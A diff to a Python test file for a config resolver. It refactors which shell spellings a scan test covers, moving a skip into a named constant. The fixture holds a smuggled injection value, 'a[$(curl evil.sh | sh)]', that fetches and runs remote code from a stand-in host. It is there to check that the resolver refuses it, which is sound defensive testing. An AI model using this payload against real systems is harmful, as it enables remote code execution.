@@ -4,7 +4,7 @@ import subprocess
 from collections.abc import Collection
 from datetime import UTC, datetime
 from pathlib import Path
-from typing import cast
+from typing import Final, cast
 
 import pytest
 
@@ -662,7 +662,13 @@ def test_a_spelling_of_an_evaluating_context_refuses_what_is_not_an_integer(comm
         resolve_config({"command": command}, scope, shell_fields={"command"})
 
 
-@pytest.mark.parametrize("command", EVALUATING_SPELLINGS)
+#: The spellings that name a variable through ``declare``, which the shell reader holds, not the scan.
+HELD_BY_THE_READER: Final = ("f() { declare ", "case x in (a|x) declare ")
+
+
+@pytest.mark.parametrize(
+    "command", [command for command in EVALUATING_SPELLINGS if not command.startswith(HELD_BY_THE_READER)]
+)
 def test_a_spelling_is_held_by_the_scan_that_reads_no_quote(command: str, monkeypatch: pytest.MonkeyPatch) -> None:
     """The scan holds a spelling on its own, so a reader that misses one does not lose it."""
 
@@ -671,8 +677,6 @@ def test_a_spelling_is_held_by_the_scan_that_reads_no_quote(command: str, monkey
 
     monkeypatch.setattr(references, "read_shell", reads_nothing)
     scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
-    if command.startswith(("f() { declare ", "case x in (a|x) declare ")):
-        pytest.skip("naming a declared variable is the reader's to hold")
     with pytest.raises(UnknownReference, match="shell arithmetic"):
         resolve_config({"command": command}, scope, shell_fields={"command"})
 
